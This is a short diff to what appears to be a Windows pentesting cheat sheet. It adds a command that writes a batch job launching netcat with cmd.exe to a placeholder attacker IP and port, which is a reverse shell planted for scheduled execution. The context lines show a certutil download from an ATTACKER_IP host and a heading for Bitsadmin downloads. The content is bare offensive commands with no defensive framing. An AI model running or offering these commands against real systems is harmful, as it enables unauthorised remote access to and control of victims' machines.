@@ -300,6 +300,10 @@ Download file:
 certutil -urlcache -split -f http://ATTACKER_IP/file file
 ```
 
+```
+echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\LogManagement\job.bat
+```
+
 ---
 
 # 10. Bitsadmin Download
